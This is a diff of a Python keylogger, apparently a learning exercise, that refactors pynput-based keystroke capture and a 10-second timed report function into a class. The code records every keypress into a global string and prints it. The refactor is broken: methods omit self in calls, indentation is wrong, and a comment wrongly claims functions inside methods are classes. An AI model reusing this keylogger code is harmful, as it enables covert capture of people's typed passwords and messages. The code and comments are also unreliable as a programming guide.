@@ -8,7 +8,8 @@ import threading
 
 log = "" #init var for storing keystrokes
 
-def process_keypress(key):
+class Keylogger: #class names start with capital letter conventionally
+    def process_keypress(self, key): #functions inside methods are classes
     global log #to define global variables
     try:
         log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
@@ -21,22 +22,22 @@ def process_keypress(key):
     #print(key.char)
     print(log)
 
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(10, report) #recursive function - report calls itself
-    timer.start()
+    def report(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(10, report) #recursive function - report calls itself
+        timer.start()
     
-keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
-#create listener object from pynput and store as var
-#pass to process_keypress function defined above
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
+        #create listener object from pynput and store as var
+        #pass to process_keypress function defined above
 
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+        with keyboard_listener:
+            report()
+            keyboard_listener.join()
 
-#since there is no place to implement a reporting function,
-#need to do something like threading to have code running in the background without
-#interrupting the program's main functions
-# aaa
+        #since there is no place to implement a reporting function,
+        #need to do something like threading to have code running in the background without
+        #interrupting the program's main functions
